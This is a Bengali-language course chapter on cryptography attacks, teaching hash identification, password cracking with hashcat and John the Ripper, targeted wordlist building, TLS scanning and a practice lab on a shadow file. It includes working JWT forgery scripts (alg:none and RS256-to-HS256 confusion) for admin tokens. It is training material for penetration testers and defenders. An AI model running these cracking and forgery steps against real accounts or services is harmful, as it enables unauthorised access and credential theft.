---
title: 'Cryptography Attacks'
subtitle: 'Hash cracking, দুর্বল cipher exploitation, PKI দুর্বলতা, JWT আক্রমণ এবং password বিশ্লেষণ।'
chapter: 11
level: 'intermediate'
readingTime: '12 মিনিট'
topics:
  [
    'hash cracking',
    'hashcat',
    'john the ripper',
    'JWT',
    'TLS attacks',
    'cryptography',
    'password cracking'
  ]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

## গল্পে বুঝি

আল-খোয়ারিজমির ঘরে একটা মজবুত combination সিন্দুক। পুরু ইস্পাতের দেয়াল, ভারী দরজা — জোর খাটিয়ে কেটে খোলা প্রায় অসম্ভব। কিন্তু একদিন এক চোর ড্রিল ছাড়াই, একটা আঁচড়ও না কেটে সিন্দুক খুলে ফেলল। কীভাবে? আল-খোয়ারিজমি code হিসেবে বসিয়েছিলেন 0000 — সবচেয়ে অনুমানযোগ্য সংখ্যা। চোরকে ইস্পাত ভাঙতে হয়নি, শুধু সহজ code-টা আন্দাজ করলেই হয়েছে।

তার প্রতিবেশী ইবনে সিনার সমস্যা আরেকটু গভীর। তার তিনটে সিন্দুক, কিন্তু তিনটেতেই এক code — একটা ফাঁস হতেই তিনটেই খুলে যায়। আর ফাতিমা আল-ফিহরি কিনেছিলেন সস্তা এক পুরনো মডেলের সিন্দুক, যার তালার নকশাই বাজারে সবার জানা, ত্রুটিটা প্রকাশ্য — নতুন কেউ চাইলে ঘরে বসেই মেকানিজম বুঝে খুলে ফেলতে পারে। তিনজনের সিন্দুকই মজবুত ছিল, তবু হেরে গেল ইস্পাতের দুর্বলতায় নয় — মালিকের দুর্বল পছন্দে।

এই গল্পটাই আসলে **cryptography attack**। সিন্দুকের ইস্পাত হলো cryptography-র গণিত — সেটা কেউ ভাঙে না। যেটা ভাঙে সেটা হলো আশপাশের দুর্বল পছন্দ: 0000 code হলো দুর্বল key (weak password), সব সিন্দুকে এক code হলো key reuse (একই key বা nonce বারবার ব্যবহার), আর সস্তা পুরনো ত্রুটিপূর্ণ মডেল হলো outdated/broken algorithm বা খারাপ implementation। crypto ভাঙে গণিত ভুল বলে নয়, ভাঙে দুর্বল আর পুনর্ব্যবহৃত key আর সেকেলে algorithm-এর কারণে। সমাধান তাই মজবুত সিন্দুকের মতোই — প্রতিটার জন্য একটা strong, unique code, আর একটা modern, বিশ্বস্ত নকশা। বাস্তবে এর মানে: strong unique key, প্রতিবার নতুন nonce, আর AES-GCM বা Argon2id-এর মতো modern vetted crypto ব্যবহার করুন — কখনও নিজের হাতে crypto বানাবেন না (never roll your own)।

<Callout type="info">

**বাস্তব জীবনের উদাহরণ**

Cryptography হলো তালা। Cryptography attack গণিত ভাঙে না — এটি খারাপ key (দুর্বল password), ভুল তালা (deprecated অ্যালগরিদম), বা খোলা দরজা (logic flaw) কাজে লাগায়। বাস্তবে বেশিরভাগ password "encryption" আসলে dictionary word সহ crackable hashing।

</Callout>

## Hash Identification

```bash
# Identify hash type
hashid '$2y$10$abc...'           # bcrypt
hashid '5f4dcc3b5aa765d61d8327' # MD5
hashid 'hash:example'

# hash-identifier
hash-identifier

# Common hash formats:
# MD5:       32 hex chars          → $1$ prefix in /etc/shadow
# SHA-1:     40 hex chars
# SHA-256:   64 hex chars          → $5$ in /etc/shadow
# SHA-512:   128 hex chars         → $6$ in /etc/shadow (modern Linux)
# bcrypt:    $2y$ or $2b$ prefix   → web app passwords (hardest to crack)
# NTLM:      32 hex chars          → Windows password hashes
# NTLMv2:    longer, includes challenge/response

# /etc/shadow prefixes:
$1$   → MD5-crypt
$2y$  → bcrypt
$5$   → SHA-256
$6$   → SHA-512 (most common on modern Linux)
```

## Hashcat — GPU-Accelerated Cracking

```bash
# Basic syntax: hashcat -m MODE -a ATTACK hash.txt wordlist.txt

# Attack modes:
# -a 0 = Dictionary attack (hash vs wordlist)
# -a 1 = Combination attack (combine two wordlists)
# -a 3 = Brute-force / mask attack
# -a 6 = Hybrid (wordlist + mask)

# Hash mode examples:
# -m 0    = MD5
# -m 100  = SHA-1
# -m 1000 = NTLM (Windows)
# -m 1800 = sha512crypt ($6$) — Linux /etc/shadow
# -m 3200 = bcrypt (web apps)
# -m 5600 = NTLMv2 (from Responder)
# -m 1400 = SHA-256
# -m 13100 = Kerberoast TGS-REP

# Dictionary attack on Linux shadow hash
hashcat -m 1800 shadow_hash.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules (mangling rules increase coverage dramatically)
hashcat -m 1800 shadow_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force — all 8-char passwords with lowercase + digits
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?d?d?d?d
# Masks: ?l=lowercase, ?u=uppercase, ?d=digit, ?s=special, ?a=all

# Incremental brute force (1 to 8 chars)
hashcat -m 0 hash.txt -a 3 -i --increment-min=1 --increment-max=8 ?a?a?a?a?a?a?a?a

# Combination attack (wordlist1 + wordlist2)
hashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt

# Show cracked results
hashcat -m 1800 shadow_hash.txt --show
```

## John the Ripper

```bash
# Simple dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Auto-detect hash format
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked
john hash.txt --show

# Crack /etc/shadow with /etc/passwd (needed for username salt)
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt

# Crack specific formats
john --format=NT hash.txt           # NTLM
john --format=sha512crypt hash.txt  # Linux $6$

# Crack zip/rar/pdf passwords
zip2john secret.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

rar2john archive.rar > rar_hash.txt
john rar_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

pdf2john document.pdf > pdf_hash.txt
john pdf_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Password বিশ্লেষণ ও Custom Wordlist

```bash
# CeWL — generate wordlist from website content
cewl http://target.com -d 3 -m 6 -w target-words.txt
# -d 3: crawl depth 3
# -m 6: minimum word length 6

# Mentalist / CUPP — generate targeted wordlist from OSINT
pip install cupp
cupp -i     # interactive, asks about target person

# Generate wordlist with company + year + special char patterns
cat << 'EOF' > company-rules.rule
# Common corporate password patterns
:
u
c
$1
$2024
$!
^company^
EOF

hashcat -m 0 hashes.txt company-words.txt -r company-rules.rule

# Analyze cracked passwords to find patterns
# (informs wordlist and rule optimization)
cat cracked.txt | cut -d: -f2 | sort | uniq -c | sort -rn | head -20
```

## JWT Attacks

JSON Web Token authentication-এর জন্য ব্যাপকভাবে ব্যবহৃত হয়। এদের বেশ কয়েকটি attack vector আছে।

```bash
# JWT structure: header.payload.signature (base64url encoded)
# Decode without verification:
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Part 2 (payload):
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ" | base64 -d
# {"sub":"1234567890","name":"Ahmad al-Razi","iat":1516239022}
```

### Algorithm Confusion — none Algorithm

```python
# If server accepts alg:none, you can forge any JWT
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).rstrip(b'=')

forged_token = f"{header.decode()}.{payload.decode()}."
print(forged_token)   # send with empty signature
```

### Weak Secret Cracking

```bash
# If HS256 and weak secret, crack with hashcat
# Extract the full JWT token
TOKEN="eyJhbGc...signature"

# Crack with hashcat (mode 16500 = JWT)
echo $TOKEN > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Or with jwt_tool
pip install jwt_tool
jwt_tool $TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

### RS256 to HS256 Confusion

```python
# If server uses RS256, some libraries verify HS256 with the public key as secret
# Forge a token signed with HS256 using the public key as the secret

import jwt  # PyJWT

public_key = open('public.pem', 'r').read()

forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    public_key,
    algorithm='HS256'
)
print(forged)
```

## TLS/SSL Attacks

```bash
# Check TLS configuration
sslscan --tlsall target.com:443
testssl.sh target.com

# Look for:
# - SSLv2, SSLv3 (POODLE — CVE-2014-3566)
# - TLS 1.0, 1.1 (deprecated, weak)
# - RC4 cipher (BEAST, NOMORE attacks)
# - Heartbleed (CVE-2014-0160)
# - BEAST
# - ROBOT

# Heartbleed check
nmap --script ssl-heartbleed -p 443 target.com

# POODLE check (SSLv3)
nmap --script ssl-poodle -p 443 target.com

# Check certificate
openssl s_client -connect target.com:443
# Inspect: expiry, CN, SANs, chain, self-signed?

# Certificate transparency for subdomain enumeration
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u
```

## Password Storage Anti-Pattern (Defender-দের যা জানা উচিত)

```
Bad (crackable instantly):
MD5(password)              → rainbow tables
SHA1(password)             → same
MD5(salt + password)       → still fast, GPU does billions/sec

Better (still crackable with resources):
SHA-256(salt + password)   → fast hash, weak cost factor

Good (designed to be slow):
bcrypt($cost, $salt, $pass) → cost factor makes it slow
scrypt(N, r, p, $pass, $salt)
Argon2id(m, t, p, $pass, $salt)  → winner of PHC, recommended today

bcrypt with cost=10: ~100ms per hash
bcrypt with cost=12: ~400ms per hash
bcrypt with cost=14: ~1.5s per hash

At 400ms/hash:
  Online attack: 2.5 guesses/second → brute force is infeasible
  Offline (hashcat with GPU): still limited by the bcrypt cost
  → strong master passwords become the last line of defense
```

## বাস্তব প্রজেক্ট: একটি Shadow File Crack করা

```bash
# Set up the lab
# Create a VM with some weak passwords for users

# On target VM (set up for practice):
echo "fatima:$(openssl passwd -6 'password123'):18000:0:99999:7:::" >> /etc/shadow
echo "omar:$(openssl passwd -6 'letmein'):18000:0:99999:7:::" >> /etc/shadow
echo "maryam:$(openssl passwd -6 'M@ry@m#2024!'):18000:0:99999:7:::" >> /etc/shadow

# Transfer shadow file to Kali
# Crack:
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
# fatima and omar crack immediately
# maryam: create targeted wordlist with cupp + rules
cupp -w maryam.txt   # add mangling rules
hashcat -m 1800 maryam_hash.txt maryam.txt -r best64.rule
```
